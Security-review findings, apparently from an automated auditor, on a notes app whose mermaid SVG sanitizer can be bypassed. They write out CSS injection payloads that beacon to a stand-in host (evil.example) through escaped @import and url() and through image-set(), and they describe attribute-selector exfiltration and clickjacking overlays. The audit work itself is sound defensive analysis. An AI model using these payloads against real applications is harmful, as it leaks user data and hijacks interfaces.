samples.summary: `scrubCss` is bypassable with ordinary CSS escapes and non-`url()` fetch functions, and the sanitizer keeps `<style>` elements even though an inline-SVG `<style>` is document-scoped, so surviving note-derived CSS restyles the whole app
samples.evidence: `scrubCss` (lines 192-196) enforces its guarantees with two regexes over raw text: `/@import[^;}]*;?/gi` and `/url\(\s*(['"]?)(?!#)[^)]*\1\s*\)/gi`. Both match literal spellings only, while CSS lets identifiers and function names be escaped: `\40 import "https://evil.example/x.css";` is a valid `@import` that the first regex never sees, and `\75 rl(https://evil.example/beacon)` is a valid `url()` the second never sees. Even without escapes, `image-set("https://evil.example/x 1x")` and `src("https://evil.example/x")` fetch external resources with no `url(` token at all. Because a `<style>` element inside inline SVG is NOT scoped to the SVG — it applies to the whole document — any CSS that survives this pass is document-wide CSS authored by whoever wrote the note. Consequences short of script execution: full external `@import` of attacker CSS, exfiltration/beaconing (attribute-selector oracles, `content: url()`), and UI redressing/clickjacking of the surrounding app chrome (`position:fixed` overlays, `display:none` on controls) in every reader's session, including anonymous viewer-role share-link visitors. There is no CSP in the repo (grep for `Content-Security-Policy` / `helmet` finds only vendored node_modules and a dictionary word) to backstop either the inline `<style>` or the outbound fetches. The comment on line 191 and the design doc (`docs/design/notes/notes.md`) present this scrub as layer 3 of the security posture, which overstates it. Safer: drop `<style>` elements outright in `sanitizeSvgMarkup` (mermaid's palette can be supplied as presentation attributes / app CSS), or at minimum parse the CSS rather than regex it.

samples.summary: `stripConfigDirectives` recognizes a narrower set of config carriers than mermaid does (closing `}%%` required, unquoted `config:` key only), and the `secure` pin only covers top-level keys, so nested note-supplied config can still reach the engine
samples.evidence:
Three gaps in the layer-2/layer-1 pairing: (1) `DIRECTIVE_RE = /%%\{[\s\S]*?\}%%/g` (line 153) requires a terminating `}%%`, while mermaid's own directive detection treats the closing `}%%` as OPTIONAL (its `detectDirective` regex ends in `(?:}%{2})?`), so an unterminated `%%{init: {"flowchart": {"htmlLabels": true}}` is ignored by the strip but still parsed as a directive by the engine. (2) The front-matter guard `/^\s*config\s*:/m` (line 165) only matches an unquoted key; YAML accepts `"config":`, so `---
"config":
  themeCSS: ...
---` is left in the fence body. (3) `secure: SECURE_KEYS` (line 327) is mermaid's key-deletion list applied to the TOP LEVEL of a directive object only — `htmlLabels`, `fontFamily` and `look` live in reality under per-diagram sections (`flowchart.htmlLabels`, `sequence.*`), so listing them at top level (lines 147-149) does not pin them; a directive that slips past (1) or (2) can still flip `htmlLabels` on, widening what note text reaches the DOM as markup and feeding the mXSS surface in the finding above. Additionally, `SECURE_KEYS` deliberately REPLACES mermaid's default list, so any key mermaid adds to its defaults in a future minor version is silently unpinned here. Confidence is low because `mermaid` is not installed in this checkout (`node_modules/mermaid` absent) so I could not execute the engine to confirm the optional-terminator behaviour or the nesting of the `secure` deletion; the two regex narrowings (1) and (2) are verifiable by inspection of the patterns alone.

verdict.reason: Verified in the repository. `scrubCss` at packages/notes/src/view/mermaid.ts:192-196 is exactly the two raw-text regexes quoted (`/@import[^;}]*;?/gi`, `/url\(\s*(['"]?)(?!#)[^)]*\1\s*\)/gi`), which match literal spellings only and miss CSS escapes (`\40 import`, `\75 rl(...)`) and non-url() fetch functions (`image-set()`, `src()`). `sanitizeSvgMarkup` keeps `<style>` elements (mermaid.ts:214-217; `style` is absent from DROPPED_TAGS at 173-188) and scrubs `style` attributes with the same weak pass (224-226). The sanitized markup lands in the live DOM via `el.innerHTML = result.svg` (mermaid.ts:378) on untrusted note content routed through preview.ts:76-77 and 205-210. The repo's own design doc calls this SVG `<style>` "document-scoped" (docs/design/notes/notes.md:372) and presents sanitizeSvgMarkup as layer 3 of the security posture (363-376), matching the overstatement the finding names. No CSP backstop exists: grep for Content-Security-Policy/helmet outside node_modules hits only the spellcheck dictionary. I rejected `already-guarded`: stripConfigDirectives (162-169) and SECURE_KEYS (133-150) close only the %%{init}%%/front-matter `themeCSS` channel, not mermaid's ordinary `classDef`/`style` statements, which flow into both the emitted style block and inline style attributes; mermaid is not installed in this tree so I could not prove that channel closed. In-lane as injection/unsafe input handling with data-exposure (beaconing, attribute-selector oracles) and UI-redressing impact; major severity is appropriate.

verdict.reason: All three cited code locations exist exactly as described. DIRECTIVE_RE (mermaid.ts:153) requires a closing `}%%`; the front-matter guard `/^\s*config\s*:/m` (mermaid.ts:165) cannot match a YAML-legal quoted key `"config":`, so such a block is not sliced (line 166) and flows unchanged into `mermaid.render(id, stripConfigDirectives(source))` at line 354 — the only note-text-to-engine path. SECURE_KEYS (lines 133-150) is a flat, top-level-shaped list that, per the file's own comment at line 134, replaces mermaid's default `secure` list, while `htmlLabels`/`fontFamily` are per-diagram-section keys in mermaid's schema. I could not establish `already-guarded`: mermaid is not installed in this checkout (no `node_modules/mermaid`; only the `^11.16.0` dep declaration in packages/notes/package.json:67), so whether mermaid's `sanitize()` recurses into nested config, whether front-matter config passes through the `secure` deletion, and whether its directive detector tolerates a missing terminator are all unverifiable here. The remaining layer, sanitizeSvgMarkup (lines 203-230), removes scripts/`on*`/unsafe URLs and scrubs `<style>` but does not neutralize `htmlLabels`-widened markup or injected inline CSS before the `innerHTML` sink at line 378. Unsafe-input/sanitizer-bypass into an innerHTML sink is in the security lane, and `major` matches "clear security weakness that isn't yet a full exploit."
